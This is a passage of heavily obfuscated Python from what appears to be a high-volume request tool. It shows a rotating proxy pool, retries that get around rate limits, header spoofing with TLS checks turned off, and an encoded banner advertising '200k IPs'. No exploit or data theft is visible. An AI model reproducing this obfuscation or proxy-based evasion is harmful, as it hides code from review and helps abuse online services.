                        if IIIIIIllIllIIllIlIllIll == 5497434:
                            lIIIIIlIlIIIIIllIlIIlllI = sum(llllIllIIllIlII) + IlIIlIIlIIIIIIIIllII % 71 - lIlIlllllIlIllIlIll
                            break
                        if IIIIIIllIllIIllIlIllIll == 4274177:
                            IlIIlIIlIIIIIIIIllII = (lIlIlllllIlIllIlIll * 5 ^ 594294) & 65535
                            IIIIIIllIllIIllIlIllIll = 2236655
                            continue
                        if IIIIIIllIllIIllIlIllIll == 3541800:
                            lIlIlllllIlIllIlIll = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][20] * 19151 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][17]
                            IIIIIIllIllIIllIlIllIll = 4274177
                            continue
                        if IIIIIIllIllIIllIlIllIll == 5201742:
                            IIIIIIllIllIIllIlIllIll = 5201742
                            continue
                        if IIIIIIllIllIIllIlIllIll == 2236655:
                            llllIllIIllIlII = [IlIIlIIlIIIIIIIIllII >> 1 & 255 for lIIllIIIlIllIIllll in range(5)]
                            IIIIIIllIllIIllIlIllIll = 5497434
                            continue
                IllIIlIllllllIIIIllII = 9712736
                continue

    def refresh_pool(self):
        IllllIlIIIlIllllllIIIIl = 5122659
        while True:
            if IllllIlIIIlIllllllIIIIl == 8758160:
                IlIlIIIllllIlllIlIlI = {p['url']: p for p in static + api}
                IllllIlIIIlIllllllIIIIl = 7061361
                continue
            if IllllIlIIIlIllllllIIIIl == 3507397:
                IllllIlIIIlIllllllIIIIl = 5122659
                continue
            if IllllIlIIIlIllllllIIIIl == 3975896:
                with getattr(self, 'lock'):
                    if getattr(self, 'refreshing'):
                        return
                    setattr(self, 'refreshing', True)
                IllllIlIIIlIllllllIIIIl = 1304666
                continue
            if IllllIlIIIlIllllllIIIIl == 6490647:
                api = getattr(self, 'fetch_from_proxyscrape')()
                IllllIlIIIlIllllllIIIIl = 8758160
                continue
            if IllllIlIIIlIllllllIIIIl == 5122659:
                IllllIlIIIlIllllllIIIIl = 3975896
                continue
            if IllllIlIIIlIllllllIIIIl == 1304666:
                static = getattr(self, 'load_static_proxies')()
                IllllIlIIIlIllllllIIIIl = 6490647
                continue
            if IllllIlIIIlIllllllIIIIl == 5110705:
                for i, p in enumerate(getattr(IlIlIIIllllIlllIlIlI, 'values')()):
                    print(f'[PROXY] Testing proxy {i + 1}/{len(IlIlIIIllllIlllIlIlI)}')
                    if getattr(self, 'check_proxy')(p):
                        getattr(IlllllIIlIlIlIIl, 'append')(p)
                    if len(IlllllIIlIlIlIIl) >= getattr(self, 'config')['max_proxies']:
                        break
                IllllIlIIIlIllllllIIIIl = 6038976
                continue
            if IllllIlIIIlIllllllIIIIl == 2078389:
                IllllIlIIIlIllllllIIIIl = 3975896
                continue
            if IllllIlIIIlIllllllIIIIl == 7061361:
                IlllllIIlIlIlIIl = []
                IllllIlIIIlIllllllIIIIl = 5110705
                continue
            if IllllIlIIIlIllllllIIIIl == 6038976:
                with getattr(self, 'lock'):
                    IIllIllllIIlII = 3701439
                    while True:
                        if IIllIllllIIlII == 9902912:
                            IIllIllllIIlII = 4680479
                            continue
                        if IIllIllllIIlII == 3701439:
                            setattr(self, 'proxies', IlllllIIlIlIlIIl)
                            IIllIllllIIlII = 2051030
                            continue
                        if IIllIllllIIlII == 2051030:
                            setattr(self, 'last_refresh', getattr(IlllllIIllIIllIIll, 'time')())
                            IIllIllllIIlII = 4680479
                            continue
                        if IIllIllllIIlII == 7713033:
                            IIllIllllIIlII = 9902912
                            continue
                        if IIllIllllIIlII == 4680479:
                            setattr(self, 'refreshing', False)
                            break
                        if IIllIllllIIlII == 5019642:
                            IIllIllllIIlII = 3701439
                            continue
                break
            if IllllIlIIIlIllllllIIIIl == 7141634:
                IllllIlIIIlIllllllIIIIl = 5110705
                continue

    def get_next_proxy(self):
        with getattr(self, 'lock'):
            lIIIlIIlIIllllllI = 2082298
            while True:
                if lIIIlIIlIIllllllI == 5261421:
                    lIIIlIIlIIllllllI = 4838850
                    continue
                if lIIIlIIlIIllllllI == 2082298:
                    if getattr(IlllllIIllIIllIIll, 'time')() - getattr(self, 'last_refresh') > getattr(self, 'config')['refresh_interval']:
                        getattr(getattr(IlIlIllllIlllIIIIll, 'Thread')(target=getattr(self, 'refresh_pool'), daemon=True), 'start')()
                    lIIIlIIlIIllllllI = 7696021
                    continue
                if lIIIlIIlIIllllllI == 7696021:
                    valid = [p for p in getattr(self, 'proxies') if p['cooldown_until'] <= getattr(IlllllIIllIIllIIll, 'time')()]
                    lIIIlIIlIIllllllI = 3411040
                    continue
                if lIIIlIIlIIllllllI == 3411040:
                    if not valid:
                        return None
                    lIIIlIIlIIllllllI = 8257354
                    continue
                if lIIIlIIlIIllllllI == 8257354:
                    return getattr(IIIllllllIlIlIllIIIIl, 'choice')(valid)['url']
                    break
                if lIIIlIIlIIllllllI == 4838850:
                    lIIIlIIlIIllllllI = 3411040
                    continue

    def mark_failed(self, url):
        with getattr(self, 'lock'):
            for p in getattr(self, 'proxies'):
                if p['url'] == url:
                    p['failures'] += 1
                    p['cooldown_until'] = getattr(IlllllIIllIIllIIll, 'time')() + getattr(self, 'config')['cooldown']
                    break
lllIIllIlIIlIllIIIIIlIll = IIllllIIIllllllIllIlIIll(IllIIIllIIIIlIIIIIlIIII)

def request_via_proxy(method, url, **kwargs):
    lIlllIllIIlIll = 5921447
    while True:
        if lIlllIllIIlIll == 2419675:
            headers = getattr(getattr(kwargs, 'get')('headers', {}), 'copy')()
            lIlllIllIIlIll = 4443819
            continue
        if lIlllIllIIlIll == 5793625:
            lIlllIllIIlIll = 9696254
            continue
        if lIlllIllIIlIll == 4997287:
            kwargs['verify'] = False
            lIlllIllIIlIll = 3972684
            continue
        if lIlllIllIIlIll == 3729625:
            lllIllllIllIlllllII = {408, 429, 500, 502, 503, 504}
            lIlllIllIIlIll = 2419675
            continue
        if lIlllIllIIlIll == 9043272:
            lIIIIlllIIllIllI = getattr(IlllllIllIIIIIlI, 'get')('timeout', 5.5)
            lIlllIllIIlIll = 5768876
            continue
        if lIlllIllIIlIll == 3109714:
            max_total_attempts = getattr(IllIIIllIIIIlIIIIIlIIII, 'get')('max_total_attempts', 4)
            lIlllIllIIlIll = 9043272
            continue
        if lIlllIllIIlIll == 3972684:
            IIlIlllIllIlIllllllllllI = None
            lIlllIllIIlIll = 9539300
            continue
        if lIlllIllIIlIll == 8405964:
            for k, v in getattr(lIIIIIlllIlIlllIIIlIII, 'items')():
                getattr(headers, 'setdefault')(k, v)
            lIlllIllIIlIll = 4661556
            continue
        if lIlllIllIIlIll == 9696254:
            return None
            break
        if lIlllIllIIlIll == 9539300:
            for lIIllIIIllIlIllII in range(1, max_total_attempts + 1):
                lIIIIIlIIIIlIll = getattr(IllIIIllIIIIlIIIIIlIIII, 'get')('enabled') and lIIllIIIllIlIllII > 1
                lIllllIIIlIlII = getattr(kwargs, 'copy')()
                if not lIIIIIlIIIIlIll:
                    lIllllIIIlIlII['timeout'] = lIIIIlllIIllIllI
                    getattr(lIllllIIIlIlII, 'pop')('proxies', None)
                else:
                    IIlIlllIllIlIllllllllllI = getattr(lllIIllIlIIlIllIIIIIlIll, 'get_next_proxy')()
                    if not IIlIlllIllIlIllllllllllI:
                        continue
                    lIllllIIIlIlII['timeout'] = proxy_timeout
                    lIllllIIIlIlII['proxies'] = {'http': IIlIlllIllIlIllllllllllI, 'https': IIlIlllIllIlIllllllllllI}
                try:
                    response = getattr(session, 'request')(method, url, **lIllllIIIlIlII)
                    if getattr(response, 'status_code') in lllIllllIllIlllllII:
                        if lIIIIIlIIIIlIll:
                            getattr(lllIIllIlIIlIllIIIIIlIll, 'mark_failed')(IIlIlllIllIlIllllllllllI)
                        continue
                    return response
                except getattr(requests, 'ConnectTimeout'):
                    IIIlIIIlIIIIlIl = 'PROXY' if lIIIIIlIIIIlIll else 'DIRECT'
                    if lIIIIIlIIIIlIll:
                        getattr(lllIIllIlIIlIllIIIIIlIll, 'mark_failed')(IIlIlllIllIlIllllllllllI)
                except getattr(requests, 'ReadTimeout'):
                    IIIlIIIlIIIIlIl = 'PROXY' if lIIIIIlIIIIlIll else 'DIRECT'
                    if lIIIIIlIIIIlIll:
                        getattr(lllIIllIlIIlIllIIIIIlIll, 'mark_failed')(IIlIlllIllIlIllllllllllI)
                except getattr(requests, 'ProxyError'):
                    if lIIIIIlIIIIlIll:
                        getattr(lllIIllIlIIlIllIIIIIlIll, 'mark_failed')(IIlIlllIllIlIllllllllllI)
                except getattr(requests, 'ConnectionError'):
                    if lIIIIIlIIIIlIll:
                        getattr(lllIIllIlIIlIllIIIIIlIll, 'mark_failed')(IIlIlllIllIlIllllllllllI)
                except getattr(requests, 'RequestException') as e:
                    if lIIIIIlIIIIlIll:
                        getattr(lllIIllIlIIlIllIIIIIlIll, 'mark_failed')(IIlIlllIllIlIllllllllllI)
            lIlllIllIIlIll = 9696254
            continue
        if lIlllIllIIlIll == 4443819:
            lIIIIIlllIlIlllIIIlIII = getattr(IIllIllllllIIIIllI, 'get_headers')()
            lIlllIllIIlIll = 8405964
            continue
        if lIlllIllIIlIll == 5768876:
            proxy_timeout = getattr(IllIIIllIIIIlIIIIIlIIII, 'get')('proxy_timeout', 5)
            lIlllIllIIlIll = 3729625
            continue
        if lIlllIllIIlIll == 5921447:
            if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][28] == 39:
                llIlIllIIIIIIllIIIlll = 9487694
                while True:
                    if llIlIllIIIIIIllIIIlll == 3381025:
                        IIIllIllllIIIIIIIIIlII = sum(lIlIIIIIllIlIllIllIlll) + IlllIIIllIlIllI % 28 - IIlllIIlIIlIlIIllIlIlII
                        break
                    if llIlIllIIIIIIllIIIlll == 1772608:
                        llIlIllIIIIIIllIIIlll = 1772608
                        continue
                    if llIlIllIIIIIIllIIIlll == 9064625:
                        llIlIllIIIIIIllIIIlll = 1772608
                        continue
                    if llIlIllIIIIIIllIIIlll == 6409435:
                        lIlIIIIIllIlIllIllIlll = [IlllIIIllIlIllI >> 3 & 255 for IIlIlIlIIIllIlIllll in range(5)]
                        llIlIllIIIIIIllIIIlll = 3381025
                        continue
                    if llIlIllIIIIIIllIIIlll == 2841255:
                        IlllIIIllIlIllI = (IIlllIIlIIlIlIIllIlIlII * 5 ^ 5739397) & 4294967295
                        llIlIllIIIIIIllIIIlll = 6409435
                        continue
                    if llIlIllIIIIIIllIIIlll == 9487694:
                        IIlllIIlIIlIlIIllIlIlII = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][5] * 912215 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][17]
                        llIlIllIIIIIIllIIIlll = 2841255
                        continue
            lIlllIllIIlIll = 3109714
            continue
        if lIlllIllIIlIll == 4661556:
            kwargs['headers'] = headers
            lIlllIllIIlIll = 4997287
            continue
lIlIllIlllIIllIIIll(autoreset=True)
llIIllIIIIlIlllIlllIlIII = 'VkxSVlZVRkZWVVZBVkZWQQ=='
IIlIIIIIlIIIIlIIllI = 'U0dWeVZFRkZWRVZGVlVWQ0E9PQ=='
lllIllIllIllIIIllll = 'VkZSU1RVRkZWRVZGVlVWQ0E9PQ=='
IlIIIIIlIlIlllllllII = [66, 89, 83, 84, 65, 82, 71, 77, 82]

def show_banner():
    if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][3] == 42:
        lIIIIIlllIllIllIllI = 5826008
        while True:
            if lIIIIIlllIllIllIllI == 8249565:
                IIlIllIIIllllIlllIIl = sum(llIIIIllIIlIIIIIIIIlllI) + lIIllIIIIIIIIlIlllll % 39 - lIlIlllllIlIIIllIllll
                break
            if lIIIIIlllIllIllIllI == 1859371:
                lIIIIIlllIllIllIllI = 7985271
                continue
            if lIIIIIlllIllIllIllI == 1679222:
                llIIIIllIIlIIIIIIIIlllI = [lIIllIIIIIIIIlIlllll >> 8 & 255 for lIllllIlllIllIlIIIIlllll in range(7)]
                lIIIIIlllIllIllIllI = 8249565
                continue
            if lIIIIIlllIllIllIllI == 7985271:
                lIIllIIIIIIIIlIlllll = (lIlIlllllIlIIIllIllll * 7 ^ 253867) & 4294967295
                lIIIIIlllIllIllIllI = 1679222
                continue
            if lIIIIIlllIllIllIllI == 5826008:
                lIlIlllllIlIIIllIllll = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][0] * 788218 + 168
                lIIIIIlllIllIllIllI = 7985271
                continue
    try:
        llIIllIllIIIlIllIlIll = 6990144
        while True:
            if llIIllIllIIIlIllIlIll == 8078690:
                llIIllIllIIIlIllIlIll = 2337539
                continue
            if llIIllIllIIIlIllIlIll == 8282186:
                return getattr('', 'join')((chr(ord(IlIIlIIIllIIllIlIllIlII[i]) ^ IlIIIIIlIlIlllllllII[i % len(IlIIIIIlIlIlllllllII)]) for i in range(len(IlIIlIIIllIIllIlIllIlII))))
                break
            if llIIllIllIIIlIllIlIll == 6990144:
                IIIllllIIIIIlIIIlIIIlll = getattr(getattr(lIlIIIIlIllIllIIl, 'b64decode')(lllIllIllIllIIIllll), 'decode')()
                llIIllIllIIIlIllIlIll = 6286962
                continue
            if llIIllIllIIIlIllIlIll == 6286962:
                IllIIlIIlIIIlll = IIIllllIIIIIlIIIlIIIlll[::-1]
                llIIllIllIIIlIllIlIll = 2337539
                continue
            if llIIllIllIIIlIllIlIll == 2337539:
                IlIIlIIIllIIllIlIllIlII = getattr(getattr(lIlIIIIlIllIllIIl, 'b64decode')(IllIIlIIlIIIlll), 'decode')()
                llIIllIllIIIlIllIlIll = 8282186
                continue
    except:
        return getattr(getattr(lIlIIIIlIllIllIIl, 'b64decode')('S0lOR1BBSU5aWQ=='), 'decode')()
lIIlIlIIIlIllIlIIIIlIIII = show_banner()

class llIIllllIllIllIllIlllIIl:
    GREEN1 = '\x1b[38;2;0;255;102m'
    GREEN2 = '\x1b[38;2;0;230;90m'
    GREEN3 = '\x1b[38;2;0;200;80m'
    GREEN_GLOW = '\x1b[38;2;0;255;102;1m'
    YELLOW1 = '\x1b[38;2;255;255;0m'
    YELLOW2 = '\x1b[38;2;255;230;0m'
    YELLOW3 = '\x1b[38;2;255;200;0m'
    YELLOW_GLOW = '\x1b[38;2;255;255;0;1m'
    RED1 = '\x1b[38;2;255;0;0m'
    RED2 = '\x1b[38;2;255;50;50m'
    RED3 = '\x1b[38;2;255;100;50m'
    RED_GLOW = '\x1b[38;2;255;0;0;1m'
    PURPLE = '\x1b[38;2;153;51;255m'
    PURPLE_GLOW = '\x1b[38;2;153;51;255;1m'
    BLUE = '\x1b[38;2;0;100;255m'
    BLUE_GLOW = '\x1b[38;2;0;100;255;1m'
    ORANGE = '\x1b[38;2;255;165;0m'
    ORANGE_GLOW = '\x1b[38;2;255;165;0;1m'
    SILVER = '\x1b[38;2;192;192;192m'
    SILVER_GLOW = '\x1b[38;2;192;192;192;1m'
    CYAN = '\x1b[38;2;0;255;255m'
    CYAN_GLOW = '\x1b[38;2;0;255;255;1m'
    GRADIENT = ['\x1b[38;2;0;255;102m', '\x1b[38;2;50;255;80m', '\x1b[38;2;100;255;60m', '\x1b[38;2;150;255;40m', '\x1b[38;2;200;255;20m', '\x1b[38;2;255;255;0m', '\x1b[38;2;255;200;0m', '\x1b[38;2;255;150;0m', '\x1b[38;2;255;100;0m', '\x1b[38;2;255;50;0m', '\x1b[38;2;255;0;0m']
    BLACK = '\x1b[30m'
    BLACK_BRIGHT = '\x1b[30;1m'
    BLACK_GLOW = '\x1b[38;2;0;0;0;1m'
    BLACK_RGB = '\x1b[38;2;0;0;0m'
    BLACK_BG = '\x1b[40m'
    BLACK_BG_BRIGHT = '\x1b[40;1m'
    BG_DARK = '\x1b[48;2;10;10;15m'
    BG_DARKER = '\x1b[48;2;5;5;10m'
    BG_GLOW = '\x1b[48;2;0;255;102;2m'
    TEXT_PRIMARY = '\x1b[38;2;0;255;102m'
    TEXT_SECONDARY = '\x1b[38;2;255;255;0m'
    TEXT_ACCENT = '\x1b[38;2;255;50;50m'
    TEXT_DIM = '\x1b[38;2;80;80;90m'
    TEXT_BRIGHT = '\x1b[38;2;255;255;255m'
    TEXT_SHADOW = '\x1b[38;2;30;30;40m'
    RST = getattr(lIllllIIlIIllIlllIIlll, 'RESET_ALL')
    BOLD = getattr(lIllllIIlIIllIlllIIlll, 'BRIGHT')
    DIM = getattr(lIllllIIlIIllIlllIIlll, 'DIM')
IlIIIIIIlIIlIlll = llIIllllIllIllIllIlllIIl()

class UI:
    BOX_TL = '╔'
    BOX_TR = '╗'
    BOX_BL = '╚'
    BOX_BR = '╝'
    BOX_H = '═'
    BOX_V = '║'
    BOX_TD = '╤'
    BOX_BD = '╧'
    BOX_LD = '╟'
    BOX_RD = '╢'
    BOX_CROSS = '╪'
    DBOX_TL = '╒'
    DBOX_TR = '╕'
    DBOX_BL = '╘'
    DBOX_BR = '╛'
    DBOX_H = '═'
    DBOX_V = '│'
    RBOX_TL = '╭'
    RBOX_TR = '╮'
    RBOX_BL = '╰'
    RBOX_BR = '╯'
    RBOX_H = '─'
    RBOX_V = '│'
    DECO_STAR = '✦'
    DECO_DIAMOND = '◆'
    DECO_SQUARE = '■'
    DECO_CIRCLE = '●'
    DECO_HEART = '♥'
    DECO_SPARK = '✧'
    DECO_FLOWER = '❀'
    DECO_ARROW = '➤'
    DECO_BULLET = '▶'
    ARROW = '▶'
    BULLET = '●'
    STAR = '✦'
    CROSS = '✕'
    CHECK = '✔'
    GEAR = '⚙'
    GLOBE = '🌐'
    USER = '👤'
    KEY = '🔑'
    SPEED = '⚡'
    RARE = '💎'
    COUPLE = '💑'
    GHOST = '👻'
    SAVE = '💾'
    TIME = '⏱'
    THREAD = '⚙'
    OMHP = '🔥'
    SHIELD = '🛡️'
    TCP = '🔌'
    WAF = '🚫'
    CROWN = '👑'
    LEGEND = '⭐'
    LOADING = '⟳'
    FIRE = '🔥'
    BOLT = '⚡'
    DIAMOND = '◆'
    SQUARE = '■'
    CIRCLE = '●'
    HEART = '♥'
IIIIllllllIlIlIllIIIIlI = 74

def center_text():
    try:
        return getattr(getattr(IllIlllllIlIIllIlIllI, 'get_terminal_size')(), 'columns') - 2
    except:
        return IIIIllllllIlIlIllIIIIlI

def color_text(text, color):
    if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][26] * 60 + 149 == 1422:
        lIlIlllIllIlIIIlIlIIll = 3314484
        while True:
            if lIlIlllIllIlIIIlIlIIll == 4183478:
                IIllllIlIllIlIllllIIlIl = sum(IlIlIlllIlllllllllIII) + llIlIIIIlllIIIIlIl % 17 - IIIllIlIlIllIIll
                break
            if lIlIlllIllIlIIIlIlIIll == 3371637:
                IlIlIlllIlllllllllIII = [llIlIIIIlllIIIIlIl >> 7 & 255 for IIIIlIlllllIllI in range(7)]
                lIlIlllIllIlIIIlIlIIll = 4183478
                continue
            if lIlIlllIllIlIIIlIlIIll == 9830656:
                llIlIIIIlllIIIIlIl = (IIIllIlIlIllIIll * 7 ^ 8503248) & 65535
                lIlIlllIllIlIIIlIlIIll = 3371637
                continue
            if lIlIlllIllIlIIIlIlIIll == 3314484:
                IIIllIlIlIllIIll = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][0] * 942780 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][15]
                lIlIlllIllIlIIIlIlIIll = 9830656
                continue
            if lIlIlllIllIlIIIlIlIIll == 4158151:
                lIlIlllIllIlIIIlIlIIll = 3371637
                continue
    return f'{color}{text}{getattr(IlIIIIIIlIIlIlll, 'RST')}'

def center_text_simple(text, width=IIIIllllllIlIlIllIIIIlI):
    IllllllllIIlIIl = 1586656
    while True:
        if IllllllllIIlIIl == 5171938:
            IIIIIlIlIllIllllIII = max(0, (width - len(text)) // 2)
            IllllllllIIlIIl = 7566902
            continue
        if IllllllllIIlIIl == 7566902:
            return ' ' * IIIIIlIlIllIllllIII + text
            break
        if IllllllllIIlIIl == 1586656:
            IllllllllIIlIIl = 5171938
            continue
        if IllllllllIIlIIl == 9413497:
            IllllllllIIlIIl = 1586656
            continue

def center_text_alt(text, width=IIIIllllllIlIlIllIIIIlI):
    return text + ' ' * (width - len(text))

def center_text_plain(text, width=IIIIllllllIlIlIllIIIIlI):
    if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][14] == 45:
        llIlIIlIIIIlllI = 6034364
        while True:
            if llIlIIlIIIIlllI == 3574215:
                llIlIIlIIIIlllI = 5191374
                continue
            if llIlIIlIIIIlllI == 6034364:
                lIIllllIllIlIlIII = 77861167
                llIlIIlIIIIlllI = 6502466
                continue
            if llIlIIlIIIIlllI == 5191374:
                llIlIIlIIIIlllI = 6034364
                continue
            if llIlIIlIIIIlllI == 1846956:
                llIlIIlIIIIlllI = 5716293
                continue
            if llIlIIlIIIIlllI == 5716293:
                lIlIIIIIlIIlIlIlIlIIIlIl = [IIllIIllIllIlIllIII >> 3 & 255 for IIIllllIIIlIIIIllIIIII in range(9)]
                llIlIIlIIIIlllI = 6491611
                continue
            if llIlIIlIIIIlllI == 6502466:
                IIllIIllIllIlIllIII = (lIIllllIllIlIlIII * 9 ^ 9977275) & 16777215
                llIlIIlIIIIlllI = 5716293
                continue
            if llIlIIlIIIIlllI == 6491611:
                IIIllIllllIIIIllIIlI = sum(lIlIIIIIlIIlIlIlIlIIIlIl) + IIllIIllIllIlIllIII % 97 - lIIllllIllIlIlIII
                break
    return ' ' * (width - len(text)) + text

def get_runtime_config():
    llIIlllIllIlIllll = 6788634
    while True:
        if llIIlllIllIlIllll == 5056799:
            status, _, IIIIIIIIIlllllllllII = getattr(lIlIlIIllllllllllIlII, 'get_status')()
            llIIlllIllIlIllll = 5030460
            continue
        if llIIlllIllIlIllll == 1524281:
            print()
            break
        if llIIlllIllIlIllll == 6192011:
            llIIlllIllIlIllll = 7756212
            continue
        if llIIlllIllIlIllll == 4456725:
            print(IlIIIIIllIllIlIllII)
            llIIlllIllIlIllll = 5056799
            continue
        if llIIlllIllIlIllll == 9078996:
            IlllIlllIlllIIIIllI = '▸ Zero Delay ▸ 200k IPs ▸ OB54'
            llIIlllIllIlIllll = 1211174
            continue
        if llIIlllIllIlIllll == 5030460:
            IIlIIlllIlIllIllIlIII = '🟢 ONLINE' if IIIIIIIIIlllllllllII else '🔴 OFFLINE'
            llIIlllIllIlIllll = 6138259
            continue
        if llIIlllIllIlIllll == 6788634:
            llIIlllIllIlIllll = 2893800
            continue
        if llIIlllIllIlIllll == 6138259:
            IllIlIlIllIIllllllII = getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW') if IIIIIIIIIlllllllllII else getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')
            llIIlllIllIlIllll = 6453618
            continue
        if llIIlllIllIlIllll == 1055055:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'TEXT_DIM')}╔{'═' * IIIIllllllIlIlIllIIIIlI}╗')
            llIIlllIllIlIllll = 7976829
            continue
        if llIIlllIllIlIllll == 7976829:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'TEXT_DIM')}║{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(IIlIIIllllIIlIlIlIlIl, IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'TEXT_DIM')}                 ')
            llIIlllIllIlIllll = 6958388
            continue
        if llIIlllIllIlIllll == 2582988:
            for i in range(IIIIllllllIlIlIllIIIIlI):
                IIllIIlIIIIlllIIlIlIl = i % len(getattr(IlIIIIIIlIIlIlll, 'GRADIENT'))
                lIIllIIlIIIllllIlllIl += f'{getattr(IlIIIIIIlIIlIlll, 'GRADIENT')[IIllIIlIIIIlllIIlIlIl]}{getattr(UI, 'BOX_H')}'
            llIIlllIllIlIllll = 8780773
            continue
        if llIIlllIllIlIllll == 4785796:
            IIlIIIllllIIlIlIlIlIl = f'{getattr(IlIIIIIIlIIlIlll, 'BG_DARKER')}    {IllIlIIllIIIIIlllIIIII}    {getattr(IlIIIIIIlIIlIlll, 'RST')}'
            llIIlllIllIlIllll = 1055055
            continue
        if llIIlllIllIlIllll == 6958388:
            print(f'{getattr(IlIIIIIIlIIlIlll, 'TEXT_DIM')}╚{'═' * IIIIllllllIlIlIllIIIIlI}╝')
            llIIlllIllIlIllll = 1524281
            continue
        if llIIlllIllIlIllll == 4445759:
            lIlllIllIlIIllIlIIlllIll = '⚡ MAX SPEED EDITION ⚡'
            llIIlllIllIlIllll = 9078996
            continue
        if llIIlllIllIlIllll == 1211174:
            IlIIIIIllIllIlIllII = f'\n{getattr(IlIIIIIIlIIlIlll, 'GRADIENT')[0]}{getattr(UI, 'BOX_TL')}{lIIllIIlIIIllllIlllIl}{getattr(UI, 'BOX_TR')}\n{getattr(IlIIIIIIlIIlIlll, 'GRADIENT')[1]}{getattr(UI, 'BOX_V')}{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'BLACK')}═══════════════════════════{getattr(IlIIIIIIlIIlIlll, 'BOLD')}{getattr(IlIIIIIIlIIlIlll, 'GREEN_GLOW')}{IllIIIIllIIllllllllIIIl}{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'BLACK')}═══════. ═════════════╗{getattr(IlIIIIIIlIIlIlll, 'GRADIENT')[1]}\n{getattr(IlIIIIIIlIIlIlll, 'GRADIENT')[3]}{getattr(UI, 'BOX_V')}{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'BLACK')}════════════════ ═══════════{getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}{lIlllIllIlIIllIlIIlllIll}{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'BLACK')}═══════════ ══════════╗{getattr(IlIIIIIIlIIlIlll, 'GRADIENT')[3]}\n{getattr(IlIIIIIIlIIlIlll, 'GRADIENT')[5]}{getattr(UI, 'BOX_V')}{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'BLACK')}══════════════════════════{getattr(IlIIIIIIlIIlIlll, 'YELLOW3')}{IlllIlllIlllIIIIllI}{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'BLACK')}══════════════════╝{getattr(IlIIIIIIlIIlIlll, 'GRADIENT')[5]}\n{getattr(IlIIIIIIlIIlIlll, 'GRADIENT')[7]}{getattr(UI, 'BOX_V')}{getattr(IlIIIIIIlIIlIlll, 'RST')}{center_text_simple(f'{getattr(IlIIIIIIlIIlIlll, 'BLACK')}═════════.  ═══════════{getattr(IlIIIIIIlIIlIlll, 'RED_GLOW')}{getattr(UI, 'SPEED')} Version 9.0 • Ultimate Safe {getattr(UI, 'SPEED')}{getattr(IlIIIIIIlIIlIlll, 'RST')}', IIIIllllllIlIlIllIIIIlI)}{getattr(IlIIIIIIlIIlIlll, 'BLACK')}════════════════╝{getattr(IlIIIIIIlIIlIlll, 'GRADIENT')[7]}\n{getattr(IlIIIIIIlIIlIlll, 'GRADIENT')[9]}{getattr(UI, 'BOX_BL')}{lIIllIIlIIIllllIlllIl}{getattr(UI, 'BOX_BR')}{getattr(IlIIIIIIlIIlIlll, 'RST')}\n'
            llIIlllIllIlIllll = 4456725
            continue
        if llIIlllIllIlIllll == 6453618:
            IllIlIIllIIIIIlllIIIII = f'{getattr(IlIIIIIIlIIlIlll, 'BLACK')}{IllIlIlIllIIllllllII}★{getattr(IlIIIIIIlIIlIlll, 'RST')} SYSTEM {IllIlIlIllIIllllllII}ACTIVE{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'YELLOW_GLOW')}⚡{getattr(IlIIIIIIlIIlIlll, 'RST')} {IllIlIlIllIIllllllII}{IIlIIlllIlIllIllIlIII}{getattr(IlIIIIIIlIIlIlll, 'RST')} {getattr(IlIIIIIIlIIlIlll, 'TEXT_DIM')}{status}{getattr(IlIIIIIIlIIlIlll, 'RST')}{IllIlIlIllIIllllllII}★{getattr(IlIIIIIIlIIlIlll, 'RST')}'
            llIIlllIllIlIllll = 4785796
            continue
